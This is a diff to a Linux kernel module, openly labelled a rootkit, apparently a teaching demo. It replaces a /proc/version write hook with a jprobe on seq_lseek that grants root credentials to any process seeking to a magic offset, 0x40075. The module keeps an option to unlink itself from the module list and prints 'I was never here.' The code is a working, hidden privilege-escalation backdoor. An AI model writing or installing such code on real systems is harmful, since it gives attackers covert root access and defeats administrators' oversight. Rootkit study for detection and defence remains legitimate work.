@@ -8,9 +8,8 @@
 #include <linux/kobject.h>
 #include <linux/err.h>
 
-#include <linux/fs.h>
-#include <linux/file.h>
-
+#include <linux/kprobes.h>
+#include <linux/seq_file.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nelson Elhage");
@@ -20,23 +19,31 @@ MODULE_VERSION("0.1");
 static bool hide_self;
 module_param(hide_self, bool, 0444);
 
-static const struct file_operations *version_fops;
-static ssize_t (*orig_write) (struct file *, const char __user *, size_t, loff_t *);
+#define MAGIC_NUMBER 0x40075
 
-static ssize_t rootkit_write (struct file *filp, const char __user *buf, size_t size, loff_t *off) {
+void get_root(void) {
+	printk(KERN_CRIT "!! getting root!!\n");
+	commit_creds(prepare_kernel_cred(NULL));
+}
+
+static int my_lseek(struct file *file, loff_t offset, int whence) {
+	if (offset == MAGIC_NUMBER) {
+		get_root();
+	}
+	jprobe_return();
 	return 0;
 }
 
+struct jprobe probe = {
+	.kp =
+	{
+		.addr = (kprobe_opcode_t *)seq_lseek,
+	},
+	.entry = (void*)my_lseek,
+};
+
 static int install_rootkit(void) {
-	struct file *version = filp_open("/proc/version", O_RDONLY, 0);
-	if (IS_ERR(version)) {
-		return PTR_ERR(version);
-	}
-	version_fops = version->f_op;
-	orig_write = version->f_op->write;
-	version->f_op->write = rootkit_write;
-	fput(version);
-	return 0;
+	return register_jprobe(&probe);
 }
 
 static int __init hello_rc_init(void) {
@@ -46,13 +53,13 @@ static int __init hello_rc_init(void) {
 		list_del(&THIS_MODULE->list);
 		printk(KERN_INFO "I was never here.\n");
 	}
-	install_rootkit();
+	if (install_rootkit() != 0)
+		printk(KERN_INFO "Error registering probe!\n");
 	return 0;
 }
 
 static void __exit hello_rc_exit(void) {
-	if (version_fops != 0)
-		version_fops->write = orig_write;
+	unregister_jprobe(&probe);
 }
 
 
